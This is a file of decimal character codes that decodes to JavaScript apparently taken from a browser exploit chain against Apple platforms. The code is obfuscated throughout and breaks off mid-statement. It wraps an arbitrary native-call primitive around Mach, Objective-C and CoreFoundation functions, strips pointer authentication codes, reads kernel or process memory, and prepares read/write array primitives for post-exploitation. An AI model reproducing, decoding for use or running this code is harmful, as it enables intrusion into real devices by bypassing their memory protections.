99, 104, 95, 118, 109, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 118, 109, 95, 100, 101, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 86, 77, 95, 68, 69, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 101, 114, 114, 111, 114, 95, 115, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 69, 82, 82, 79, 82, 95, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 109, 97, 99, 104, 95, 112, 111, 114, 116, 95, 97, 108, 108, 111, 99, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 77, 65, 67, 72, 95, 80, 79, 82, 84, 95, 65, 76, 76, 79, 67, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 48, 110, 59, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 103, 101, 116, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 40, 41, 10, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 117, 116, 115, 110, 97, 109, 101, 32, 61, 32, 99, 97, 108, 108, 111, 99, 40, 50, 53, 54, 110, 44, 32, 53, 110, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 102, 99, 97, 108, 108, 40, 85, 78, 65, 77, 69, 44, 32, 117, 116, 115, 110, 97, 109, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 32, 61, 32, 117, 116, 115, 110, 97, 109, 101, 32, 43, 32, 40, 50, 53, 54, 110, 32, 42, 32, 52, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 103, 95, 100, 101, 118, 105, 99, 101, 95, 109, 97, 99, 104, 105, 110, 101, 59, 10, 125, 10, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 82, 69, 76, 69, 65, 83, 69, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 82, 101, 108, 101, 97, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 72, 79, 87, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 104, 111, 119, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 32, 32, 32, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 34, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 48, 56, 48, 48, 48, 49, 48, 48, 110, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 75, 101, 121, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 108, 101, 116, 32, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 107, 67, 70, 84, 121, 112, 101, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 86, 97, 108, 117, 101, 67, 97, 108, 108, 66, 97, 99, 107, 115, 34, 41, 46, 110, 111, 80, 65, 67, 40, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 67, 114, 101, 97, 116, 101, 77, 117, 116, 97, 98, 108, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 67, 82, 69, 65, 84, 69, 77, 85, 84, 65, 66, 76, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 68, 105, 99, 116, 105, 111, 110, 97, 114, 121, 83, 101, 116, 86, 97, 108, 117, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 68, 73, 67, 84, 73, 79, 78, 65, 82, 89, 83, 69, 84, 86, 65, 76, 85, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 78, 117, 109, 98, 101, 114, 67, 114, 101, 97, 116, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 78, 85, 77, 66, 69, 82, 67, 82, 69, 65, 84, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 82, 69, 76, 69, 65, 83, 69, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 104, 111, 119, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 72, 79, 87, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 67, 79, 80, 89, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 67, 70, 83, 84, 82, 73, 78, 71, 67, 82, 69, 65, 84, 69, 87, 73, 84, 72, 67, 83, 84, 82, 73, 78, 71, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 95, 105, 110, 105, 116, 40, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 65, 76, 76, 79, 67, 95, 73, 78, 73, 84, 44, 32, 99, 108, 97, 115, 115, 95, 111, 98, 106, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 71, 69, 84, 67, 76, 65, 83, 83, 44, 32, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 99, 108, 97, 115, 115, 95, 110, 97, 109, 101, 41, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 46, 46, 46, 97, 114, 103, 115, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 79, 66, 74, 67, 95, 77, 83, 71, 83, 69, 78, 68, 44, 32, 46, 46, 46, 97, 114, 103, 115, 41, 59, 32, 125, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 99, 115, 116, 114, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 102, 99, 97, 108, 108, 40, 83, 69, 76, 95, 82, 69, 71, 73, 83, 84, 69, 82, 78, 65, 77, 69, 44, 32, 99, 115, 116, 114, 41, 59, 32, 125, 10, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 58, 115, 101, 108, 101, 99, 116, 111, 114, 58, 111, 98, 106, 101, 99, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 110, 118, 111, 107, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 108, 101, 97, 115, 101, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 58, 97, 116, 73, 110, 100, 101, 120, 58, 34, 41, 41, 59, 10, 108, 101, 116, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 115, 116, 97, 114, 116, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 115, 101, 108, 95, 114, 101, 103, 105, 115, 116, 101, 114, 78, 97, 109, 101, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 115, 116, 97, 114, 116, 34, 41, 41, 59, 10, 10, 108, 101, 116, 32, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 73, 110, 118, 111, 99, 97, 116, 105, 111, 110, 34, 41, 59, 10, 108, 101, 116, 32, 106, 115, 99, 95, 99, 108, 97, 115, 115, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 74, 83, 67, 111, 110, 116, 101, 120, 116, 34, 41, 59, 10, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 32, 61, 32, 111, 98, 106, 99, 95, 103, 101, 116, 67, 108, 97, 115, 115, 40, 34, 78, 83, 84, 104, 114, 101, 97, 100, 34, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 99, 115, 116, 114, 105, 110, 103, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 87, 105, 116, 104, 67, 83, 116, 114, 105, 110, 103, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 115, 116, 114, 105, 110, 103, 44, 32, 107, 67, 70, 83, 116, 114, 105, 110, 103, 69, 110, 99, 111, 100, 105, 110, 103, 85, 84, 70, 56, 41, 59, 10, 125, 10, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 105, 115, 78, 97, 78, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 105, 115, 78, 97, 78, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 34, 41, 41, 59, 10, 108, 101, 116, 32, 99, 102, 115, 116, 114, 95, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 40, 103, 101, 116, 95, 99, 115, 116, 114, 105, 110, 103, 40, 34, 117, 110, 98, 111, 120, 101, 100, 95, 97, 114, 114, 34, 41, 41, 59, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 99, 114, 101, 97, 116, 101, 95, 99, 102, 115, 116, 114, 105, 110, 103, 95, 99, 111, 112, 121, 40, 99, 102, 115, 116, 114, 105, 110, 103, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 67, 70, 83, 116, 114, 105, 110, 103, 67, 114, 101, 97, 116, 101, 67, 111, 112, 121, 40, 107, 67, 70, 65, 108, 108, 111, 99, 97, 116, 111, 114, 68, 101, 102, 97, 117, 108, 116, 44, 32, 99, 102, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 111, 98, 106, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 114, 101, 108, 101, 97, 115, 101, 41, 59, 32, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 111, 98, 106, 44, 32, 99, 102, 115, 116, 114, 95, 107, 101, 121, 41, 10, 123, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 111, 98, 106, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 44, 32, 